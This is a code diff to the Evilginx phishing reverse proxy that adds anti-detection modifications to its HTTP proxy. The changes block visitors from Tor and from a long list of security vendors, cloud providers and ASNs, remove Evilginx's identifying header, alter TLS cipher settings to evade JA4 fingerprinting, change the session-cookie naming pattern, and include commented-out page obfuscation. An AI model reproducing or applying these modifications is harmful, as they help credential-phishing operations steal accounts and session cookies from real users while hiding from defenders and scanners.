@@ -90,6 +90,19 @@ type ProxySession struct {
 	PhishletName string
 	Index        int
 }
+//MODIFICA
+type IPinfo struct {
+	IP string
+	Hostname string
+	City string
+	Region string
+	Country string
+	Loc string
+	ORG string
+	Postal string
+	Timezone string
+	Readme string
+}
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
@@ -175,9 +188,58 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 			}
+			
+		    //MODIFICA
+			if !p.isWhitelistedIP(from_ip, "pl_name") {
+			    log.Info("IP [%s] is not whitelisted", from_ip)
+			    ip := net.ParseIP(from_ip)
+			    ips, err := net.LookupIP( ReverseIPAddress(ip) + ".dnsel.torproject.org" )
+			    if err == nil{
+				    log.Warning("IP %s blocked because is TOR related", from_ip)
+				    for _, record := range ips {
+					    log.Warning("Response from dnsel.torproject.org: %s\n", record.String())
+				    }
+				    if p.cfg.GetBlacklistMode() == "unauth" {
+					    err := p.bl.AddIP(from_ip)
+					    if err != nil {
+						    log.Error("Failed to blacklist ip address: %s - %s", from_ip, err)
+					    } else {
+						    log.Warning("Blacklisted ip address: %s", from_ip)
+					    }
+				    }
+				    return p.blockRequest(req)
+			    }
+			    responseIP, _ := http.Get("http://ipinfo.io/" + from_ip + "/json")
+			    defer responseIP.Body.Close()
+			    jsonIPdata, _ := ioutil.ReadAll(responseIP.Body)
+			    var ipinfo IPinfo
+			    json.Unmarshal([]byte(jsonIPdata), &ipinfo)
+			    log.Info("Data extracted from IP [%s]: \n\tORG:\t\t%s\n\tHOSTNAME:\t%s", ipinfo.IP, ipinfo.ORG, ipinfo.Hostname)
+
+			    org_to_block := []string{"Google", "Microsoft", "Forcepoint", "Mimecast", "ZSCALER", "Fortinet", "Amazon", "PALO ALTO", "RIPE", "McAfee", "M247", "Internap", "AS205100", "YISP", "Kaspersky", "Berhad", "DigitalOcean", "IP Volume", "Markus", "ColoCrossing", "Norton", "Datacamp Limited", "Scalair SAS", "NForce Entertainment", "Wintek Corporation", "ONLINE S.A.S.", "WestHost", "Labitat", "Orange Polska Spolka Akcyjna", "OVH SAS", "DediPath", "AVAST", "GoDaddy", "SunGard", "Netcraft", "Emsisoft", "CHINANET", "Rackspace", "Selectel", "Sia Nano IT", "AS1257", "Zenlayer", "Hetzner", "AS51852", "TalkTalk Communications", "Spectre Operations", "VolumeDrive", "Powerhouse Management", "HIVELOCITY", "SoftLayer Technologies", "AS3356", "AS855", "AS7459", "AS42831", "AS61317", "AS5089", "Faction", "Plusnet", "Total Server", "AS262997", "AS852", "Guanghuan Xinwang", "AS174", "AS45090", "AS41887", "Contabo", "IPAX", "AS58224", "AS18002", "HangZhou", "Linode", "AS6849", "AS34665", "SWIFT ONLINE BORDER", "AS38511", "AS131111", "Telefonica del Peru", "BRASIL S.A", "Merit Network", "Beijing", "QuadraNet", "Afrihost", "Vimpelcom", "Allstream", "Verizon", "HostRoyale", "Hurricane Electric", "AS12389", "Packet Exchange", "AS52967", "AS45974", "AS17552", "Alibaba", "AS12978", "AS43754", "CariNet", "AS28006", "Free Technologies", "DataHata", "GHOSTnet", "AS55720", "Emerald Onion", "AS208323", "AS6730", "AS11042", "AS53667", "AS28753", "AS28753", "Globalhost d.o.o", "AS133119", "Huawei", "FastNet", "AS267124", "BKTech", "Optisprint", "AS24151", "Pogliotti", "321net", "AS4800", "Kejizhongyi", "SIMBANET", "AS42926", "Web2Objects", "AS12083", "AS206804", "AS46573", "AS18779", "AS398355", "AS4713", "AS7506", "AS9595","AS3223","AS3561","AS3842","AS4250","AS4323","AS4694","AS5577","AS6724","AS6870","AS6939","AS7203","AS7489","AS7506","AS7850","AS7979","AS8075","AS8100","AS8455","AS8560","AS8972","AS9009","AS9370","AS10297","AS10439","AS10929","AS11588","AS11831","AS11878","AS12586","AS12876","AS12989","AS13213","AS13739","AS13926","AS14061","AS14127","AS14618","AS15003","AS15083","AS15169","AS15395","AS15497","AS15510","AS15626","AS15734","AS16125","AS16262","AS16276","AS16284","AS16397","AS16509","AS16628","AS17216","AS18450","AS18779","AS18978","AS19084","AS19318","AS19437","AS19531","AS19624","AS19844","AS19871","AS19969","AS20021","AS20264","AS20454","AS20473","AS20598","AS20738","AS20773","AS20836","AS20860","AS21100","AS21159","AS21321","AS21859","AS22363","AS22552","AS22781","AS23033","AS23342","AS23352","AS24482","AS24768","AS24875","AS24940","AS24961","AS24971","AS25163","AS25369","AS25379","AS25780","AS25820","AS27257","AS28753","AS29066","AS29073","AS29182","AS29302","AS29354","AS29465","AS29550","AS29691","AS29802","AS29838","AS29854","AS30083","AS30176","AS30475","AS30633","AS30693","AS30900","AS30998","AS31034","AS31103","AS32097","AS32181","AS32244","AS32475","AS32489","AS32613","AS32780","AS33070","AS33083","AS33182","AS33302","AS33330","AS33387","AS33438","AS33480","AS33724","AS33785","AS33891","AS34305","AS34971","AS34989","AS35017","AS35366","AS35415","AS35470","AS35662","AS35908","AS35916","AS36024","AS36114","AS36290","AS36351","AS36352","AS36666","AS36873","AS36887","AS36920","AS36970","AS37018","AS37088","AS37153","AS37170","AS37209","AS37230","AS37248","AS37269","AS37280","AS37308","AS37347","AS37377","AS37472","AS37506","AS37521","AS37540","AS37643","AS37661","AS37692","AS37714","AS38001","AS39020","AS39326","AS39351","AS39392","AS39572","AS40156","AS40244","AS40676","AS40824","AS40861","AS41653","AS41665","AS42160","AS42331","AS42473","AS42695","AS42708","AS42730","AS42831","AS43146","AS49505","AS43289","AS43317","AS43350","AS44050","AS44066","AS45102","AS45187","AS45470","AS45671","AS45815","AS46261","AS46430","AS46475","AS46562","AS46664","AS46805","AS46816","AS46844","AS47328","AS47447","AS47588","AS49349","AS49367","AS49453","AS49505","AS49532","AS49544","AS49981","AS50297","AS50613","AS50673","AS51159","AS51167","AS51191","AS51395","AS51430","AS51731","AS51765","AS51852","AS52048","AS52173","AS52219","AS53013","AS53340","AS53559","AS53597","AS53667","AS53755","AS53850","AS53889","AS54104","AS54203","AS54455","AS54489","AS54500","AS54540","AS55225","AS55286","AS55536","AS55933","AS55967","AS56322","AS56630","AS56934","AS57043","AS57169","AS57230","AS57858","AS58073","AS58305","AS59253","AS59349","AS59432","AS59504","AS59729","AS59764","AS60011","AS60068","AS60118","AS60404","AS60485","AS60505","AS60558","AS60567","AS60781","AS61102","AS61157","AS61317","AS61440","AS62217","AS62240","AS62282","AS62370","AS62471","AS62540","AS62567","AS63008","AS63018","AS63119","AS63128","AS63199","AS63473","AS63949","AS64245","AS64484","AS132816","AS133296","AS133480","AS133752","AS134451","AS136258","AS197155","AS197328","AS198310","AS199653","AS199883","AS200019","AS200039","AS201011","AS201525","AS202053","AS202836","AS203523","AS203629","AS204196","AS327705","AS327784","AS327813","AS327942","AS328035","AS394256","AS394330","AS394380","AS395089","AS395111","AS395978","AS20248","AS44901","AS200904","AS53057","AS200532","AS50968","AS135822","AS55293","AS57286","AS201200","AS24549","AS39458","AS200000","AS14576","AS54290","AS206898","AS60117","AS20448","AS201553","AS54825","AS31472","AS8556","AS29119","AS60476","AS25532","AS54500","AS49949","AS51698","AS42442","AS11274","AS57345","AS54817","AS200019","AS53342","AS33569","AS201983","AS132425","AS197395","AS42699","AS31698","AS42612","AS29311","AS54527","AS63213","AS27175","AS13209","AS29140","AS27223","AS31659","AS49834","AS49693","AS30152","AS19133","AS198414","AS45201","AS31981","AS62605","AS61280","AS53332","AS61147","AS51109","AS19234","AS40438","AS58797","AS26978","AS29748","AS35974","AS262990","AS43021","AS42695","AS39704","AS62899","AS53281","AS59615","AS55761","AS52335","AS16973","AS196827","AS32647","AS14992","AS198968","AS196745","AS62071","AS132869","AS56106","AS32911","AS24931","AS57669","AS48896","AS45481","AS132509","AS39839","AS63129","AS53370","AS25048","AS28747","AS46433","AS55051","AS18570","AS13955","AS16535","AS22903","AS9823","AS46945","AS263032","AS36536","AS50986","AS199733","AS48825","AS35914","AS33552","AS52236","AS28855","AS198347","AS40728","AS18120","AS53914","AS12586","AS55720","AS27640","AS62563","AS202118","AS9290","AS45887","AS51050","AS20068","AS49485","AS40374","AS14415","AS46873","AS14384","AS54555","AS263237","AS20773","AS53918","AS4851","AS32306","AS133229","AS28216","AS36236","AS42210","AS51248","AS49815","AS34649","AS41562","AS33260","AS24220","AS52347","AS45486","AS33182","AS53055","AS51290","AS132225","AS133120","AS42776","AS55799","AS48446","AS263093","AS56732","AS42399","AS47385","AS40539","AS42244","AS29302","AS10929","AS47549","AS200147","AS393326","AS198171","AS57773","AS47583","AS43472","AS32338","AS9166","AS62082","AS198651","AS24725","AS29067","AS197902","AS42418","AS29097","AS196645","AS56110","AS23535","AS29869","AS62756","AS26484","AS25926","AS15189","AS20401","AS24679","AS25128","AS39756","AS32400","AS9412","AS9667","AS51294","AS23052","AS28099","AS45693","AS17881","AS17669","AS17918","AS50926","AS201634","AS22611","AS54641","AS61102","AS132071","AS10207","AS45577","AS132070","AS262603","AS29883","AS24558","AS38279","AS199997","AS50465","AS14120","AS11235","AS50655","AS17019","AS31240","AS199481","AS16862","AS47161","AS56784","AS59791","AS59677","AS202023","AS199990","AS50872","AS54839","AS58936","AS11230","AS62310","AS38894","AS47172","AS262287","AS46260","AS14442","AS133143","AS197648","AS39451","AS58922","AS27589","AS42400","AS133393","AS201597","AS28997","AS60800","AS33322","AS38001","AS199129","AS197372","AS57752","AS201670","AS14244","AS22152","AS34541","AS196678","AS43198","AS47625","AS42331","AS62049","AS35295","AS42311","AS53589","AS59705","AS36791","AS14160","AS34432","AS41062","AS59135","AS201630","AS25260","AS23108","AS40281","AS31590","AS10532","AS22720","AS27357","AS33070","AS45187","AS7595","AS26481","AS29713","AS13926","AS54203","AS62651","AS63128","AS62838","AS30849","AS14987","AS47577","AS54334","AS63916","AS50915","AS21217","AS59816","AS23273","AS59632","AS29452","AS59795","AS60739","AS15919","AS49313","AS57879","AS56617","AS62088","AS45179","AS27597","AS201702","AS32740","AS58667","AS12617","AS199847","AS25642","AS14567","AS35278","AS197914","AS41079","AS1442","AS43620","AS197439","AS198313","AS42705","AS44398","AS13909","AS34745","AS24958","AS17971","AS47143","AS59854","AS57682","AS3722","AS13647","AS20450","AS30235","AS47205","AS23881","AS198047","AS14986","AS17920","AS32275","AS50608","AS199213","AS262170","AS201862","AS43541","AS24381","AS10200","AS14708","AS27229","AS48093","AS42465","AS7598","AS30475","AS55229","AS7349","AS33251","AS52465","AS52270","AS45152","AS8477","AS198153","AS52925","AS61412","AS262978","AS53225","AS41427","AS53101","AS41369","AS35467","AS59554","AS52674","AS24611","AS48812","AS40715","AS201449","AS52321","AS29331","AS201709","AS53221","AS198432","AS51241","AS19969","AS56799","AS26277","AS58113","AS28333","AS42120","AS6718","AS20692","AS17439","AS132717","AS9925","AS132779","AS42622","AS6188","AS40819","AS24997","AS38107","AS36408","AS57363","AS46177","AS62026","AS61107","AS3209","AS31034","AS9605","AS132347","AS203999","AS204472","AS204957"}
+			    for _, org_block := range org_to_block {
+				    if strings.Contains(ipinfo.ORG, org_block) {
+					    log.Warning("IP %s blocked because the ORG is blacklisted: %s", ipinfo.IP, ipinfo.ORG)
+					    if p.cfg.GetBlacklistMode() == "unauth" {
+						    err := p.bl.AddIP(from_ip)
+						    if err != nil {
+							    log.Error("Failed to blacklist ip address: %s - %s", from_ip, err)
+						    } else {
+							    log.Warning("Blacklisted ip address: %s", from_ip)
+						    }
+					    }
+					    return p.blockRequest(req)
+				    }
+			    }
+		    } else {
+			    log.Debug("IP [%s] is whitelisted", from_ip)
+		    }
+			
+			
+			
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
+			//o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -409,7 +471,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// THISISAMOD Remove Header Evilginx
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -606,7 +669,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// THISISAMOD Remove Header Evilginx
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1063,6 +1127,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 						}
 					}
+					// THISISAMOD Obfuscate frontend
+					// subFilter WILL NOT WORK
+					//encodedBody := base64.StdEncoding.EncodeToString(body)
+					//body = []byte(fmt.Sprintf("<script>document.write(decodeURIComponent(atob('%s')));</script>", encodedBody))
+					// END
+
+
+
+
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1394,44 +1467,53 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 	return body
 }
 
+//THISISAMOD Funciton TLSConfigFromCA completely rewritten to reflect modification on TLS cipher suites for JA4 antifingerprinting
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
-		port := 443
-		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
-		}
+        return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+                parts := strings.SplitN(host, ":", 2)
+                hostname := parts[0]
+                port := 443
+                if len(parts) == 2 {
+                        port, _ = strconv.Atoi(parts[1])
+                }
 
-		tls_cfg := &tls.Config{}
-		if !p.developer {
+                tls_cfg := &tls.Config{
+                    CipherSuites:             p.cfg.general.CipherSuites,
+                    PreferServerCipherSuites: false,
+                    MinVersion:               p.cfg.general.TLSMinVersion,
+                    MaxVersion:               p.cfg.general.TLSMaxVersion,
+                }
+                if !p.developer {
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
+                        tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
+                        tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.Nex>
 
-			return tls_cfg, nil
-		} else {
-			var ok bool
-			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
-			}
-
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-			if err != nil {
-				log.Error("http_proxy: %s", err)
-				return nil, err
-			}
-			return &tls.Config{
-				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
-			}, nil
-		}
-	}
+                        return tls_cfg, nil
+                } else {
+                        var ok bool
+                        phish_host := ""
+                        if !p.cfg.IsLureHostnameValid(hostname) {
+                                phish_host, ok = p.replaceHostWithPhished(hostname)
+                                if !ok {
+                                        log.Debug("phishing hostname not found: %s", hostname)
+                                        return nil, fmt.Errorf("phishing hostname not found")
+                                }
+                        }
+                        cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+                        if err != nil {
+                                log.Error("http_proxy: %s", err)
+                                return nil, err
+                        }
+                        return &tls.Config{
+                                InsecureSkipVerify: true,
+                                Certificates:       []tls.Certificate{*cert},
+                                CipherSuites:       p.cfg.general.CipherSuites,
+                                PreferServerCipherSuites: false,
+                                MinVersion:         p.cfg.general.TLSMinVersion,
+                                MaxVersion:         p.cfg.general.TLSMaxVersion,
+                        }, nil
+                }
+        }
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
@@ -1654,9 +1736,10 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// THISISAMOD Remove Header Evilginx
+//func (p *HttpProxy) getHomeDir() string {
+//	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -1851,8 +1934,7 @@ func getContentType(path string, data []byte) string {
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
-	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
-	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = s_hash[:4] + "-" + s_hash[4:]
-	return s_hash
+    hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
+    s_hash := fmt.Sprintf("%x", hash[:8]) // THISISAMOD change pattern cookie to avoid fingerprint
+    return s_hash
 }
